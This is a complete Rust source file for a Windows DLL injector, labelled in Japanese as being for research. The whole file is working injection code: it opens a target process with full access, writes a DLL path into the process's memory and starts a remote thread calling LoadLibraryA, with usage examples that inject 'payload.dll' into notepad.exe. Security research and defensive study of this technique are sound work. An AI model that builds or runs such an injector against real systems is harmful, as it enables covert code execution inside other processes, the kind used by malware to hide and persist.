//! DLL Injector (Windows) - 研究目的
//! 手法: CreateRemoteThread + LoadLibraryA
//!
//! 使用方法:
//!   dll_injector.exe <process_name> <dll_path>
//!   dll_injector.exe <pid> <dll_path>
//!
//! 例:
//!   dll_injector.exe notepad.exe C:\payload.dll
//!   dll_injector.exe 1234 C:\payload.dll

#![cfg(target_os = "windows")]

use std::ffi::CString;
use std::path::Path;

use windows::core::{Error, PCSTR};
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::LibraryLoader::GetProcAddress;
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS,
};
use windows::Win32::System::LibraryLoader::GetModuleHandleA;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 3 {
        eprintln!("Usage: {} <pid|process_name> <dll_path>", args[0]);
        eprintln!("  Example: {} notepad.exe C:\\payload.dll", args[0]);
        std::process::exit(1);
    }

    let target = &args[1];
    let dll_path = &args[2];

    // DLLパスの検証
    if !Path::new(dll_path).exists() {
        eprintln!("[-] DLL not found: {}", dll_path);
        std::process::exit(1);
    }

    // PID解決
    let pid = match target.parse::<u32>() {
        Ok(pid) => pid,
        Err(_) => match find_pid_by_name(target) {
            Some(pid) => pid,
            None => {
                eprintln!("[-] Process not found: {}", target);
                std::process::exit(1);
            }
        },
    };

    println!("[*] Target PID: {}", pid);
    println!("[*] DLL path: {}", dll_path);

    match inject(pid, dll_path) {
        Ok(_) => println!("[+] Injection succeeded"),
        Err(e) => eprintln!("[-] Injection failed: {}", e),
    }
}

/// プロセス名からPIDを検索
fn find_pid_by_name(name: &str) -> Option<u32> {
    let snapshot = unsafe {
        CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?
    };

    let mut entry = PROCESSENTRY32 {
        dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
        ..Default::default()
    };

    let found = unsafe {
        if Process32First(snapshot, &mut entry).is_err() {
            CloseHandle(snapshot).ok();
            return None;
        }

        loop {
            let proc_name = {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                String::from_utf8_lossy(
                    &entry.szExeFile[..len]
                        .iter()
                        .map(|&c| c as u8)
                        .collect::<Vec<_>>(),
                )
                .to_string()
            };

            if proc_name.eq_ignore_ascii_case(name) {
                let pid = entry.th32ProcessID;
                CloseHandle(snapshot).ok();
                break Some(pid);
            }

            if Process32Next(snapshot, &mut entry).is_err() {
                CloseHandle(snapshot).ok();
                break None;
            }
        }
    };

    found
}

/// メインインジェクションロジック
fn inject(pid: u32, dll_path: &str) -> Result<(), Error> {
    // 絶対パスに変換
    let abs_path = std::fs::canonicalize(dll_path)
        .map_err(|_| Error::from_win32())?
        .to_string_lossy()
        .to_string();

    // UNCプレフィックスを除去 (\\?\C:\... -> C:\...)
    let abs_path = abs_path.strip_prefix("\\\\?\\").unwrap_or(&abs_path).to_string();

    let dll_cstr = CString::new(abs_path.as_str()).map_err(|_| Error::from_win32())?;
    let dll_bytes = dll_cstr.as_bytes_with_nul();

    // プロセスをオープン
    let process: HANDLE = unsafe {
        OpenProcess(PROCESS_ALL_ACCESS, false, pid)?
    };

    // プロセス終了時にハンドルを閉じる
    let _process_guard = HandleGuard(process);

    // ターゲットプロセスのアドレス空間にメモリを確保
    let remote_mem = unsafe {
        VirtualAllocEx(
            process,
            None,
            dll_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_mem.is_null() {
        return Err(Error::from_win32());
    }

    println!("[*] Allocated remote memory at: {:p}", remote_mem);

    // メモリ確保失敗時のクリーンアップ用クロージャ
    let free_mem = || unsafe {
        let _ = VirtualFreeEx(process, remote_mem, 0, MEM_RELEASE);
    };

    // DLLパス文字列をリモートプロセスへ書き込み
    let written = write_process_memory(process, remote_mem, dll_bytes)?;
    if written != dll_bytes.len() {
        free_mem();
        eprintln!("[-] WriteProcessMemory: wrote {} / {} bytes", written, dll_bytes.len());
        return Err(Error::from_win32());
    }

    println!("[*] Wrote {} bytes to remote process", written);

    // kernel32.dll の LoadLibraryA アドレスを取得
    // 注: 64bitプロセス間では同一アドレスに存在する前提 (ASLR考慮外)
    let kernel32 = unsafe {
        let name = CString::new("kernel32.dll").unwrap();
        GetModuleHandleA(PCSTR(name.as_ptr() as *const u8))?
    };

    let load_library_addr = unsafe {
        let name = CString::new("LoadLibraryA").unwrap();
        GetProcAddress(kernel32, PCSTR(name.as_ptr() as *const u8))
    };

    let load_library_fn = match load_library_addr {
        Some(addr) => addr,
        None => {
            free_mem();
            return Err(Error::from_win32());
        }
    };

    println!("[*] LoadLibraryA at: {:p}", load_library_fn as *const ());

    // リモートスレッドを作成し LoadLibraryA(remote_dll_path) を実行
    let thread_start: windows::Win32::System::Threading::LPTHREAD_START_ROUTINE =
        Some(unsafe { std::mem::transmute(load_library_fn) });

    let thread = unsafe {
        CreateRemoteThread(
            process,
            None,
            0,
            thread_start,
            Some(remote_mem),
            0,
            None,
        )?
    };

    println!("[*] Remote thread created, waiting for completion...");

    // スレッド終了を待機 (最大10秒)
    unsafe {
        WaitForSingleObject(thread, 10_000);
        CloseHandle(thread).ok();
    }

    // リモートメモリを解放
    free_mem();

    Ok(())
}

/// WriteProcessMemory ラッパー (safe)
fn write_process_memory(
    process: HANDLE,
    base_addr: *mut std::ffi::c_void,
    data: &[u8],
) -> Result<usize, Error> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;

    let mut written: usize = 0;
    unsafe {
        WriteProcessMemory(
            process,
            base_addr,
            data.as_ptr() as *const _,
            data.len(),
            Some(&mut written),
        )?;
    }
    Ok(written)
}

/// HANDLE の RAII ガード
struct HandleGuard(HANDLE);

impl Drop for HandleGuard {
    fn drop(&mut self) {
        unsafe {
            let _ = CloseHandle(self.0);
        }
    }
}
